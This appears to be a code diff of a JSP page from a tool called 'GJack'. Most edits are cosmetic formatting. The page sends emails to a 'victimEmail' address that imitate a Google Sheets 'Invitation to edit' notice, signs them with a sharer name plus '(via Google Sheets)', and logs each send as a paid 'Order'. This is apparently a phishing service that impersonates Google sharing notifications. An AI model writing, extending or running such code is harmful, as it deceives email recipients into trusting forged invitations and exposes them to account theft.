@@ -6,7 +6,6 @@
 <%@ page import="com.theah64.webengine.utils.Form" %>
 <%@ page import="com.theah64.webengine.utils.MailHelper" %>
 <%@ page import="com.theah64.webengine.utils.RandomString" %>
-<%@ page import="com.theah64.webengine.utils.RequestException" %>
 <%@ page import="java.sql.SQLException" %>
 <html>
 <head>
@@ -14,7 +13,7 @@
         final String key = RandomString.get(10);
     %>
     <title>GJack</title>
-    <%@include file="common_headers.jsp"%>
+    <%@include file="common_headers.jsp" %>
 
     <script>
         $(document).ready(function () {
@@ -84,13 +83,13 @@
 
                 //Sending mail
                 MailHelper.init(gmailUsername, gmailPassword);
-                MailHelper.sendMail(victimEmail, docTitle + " - Invitation to edit", content, sharedBy+" (via Google Sheets)");
+                MailHelper.sendMail(victimEmail, docTitle + " - Invitation to edit", content, sharedBy + " (via Google Sheets)");
 
                 //Adding data to db
-                Orders.getInstance().add(new Order(id, key, victimEmail, userEmail, sharedBy, docTitle, docUrl, content, false));
+                Orders.getInstance().add(new Order(null, key, victimEmail, userEmail, sharedBy, docTitle, docUrl, content, false));
             }
 
-        } catch ( MailException | SQLException e) {
+        } catch (MailException | SQLException e) {
             e.printStackTrace();
 
     %>
@@ -103,6 +102,7 @@
     <div class="row">
 
         <div class="col-md-4">
+
             <form action="order.jsp" method="POST">
 
 
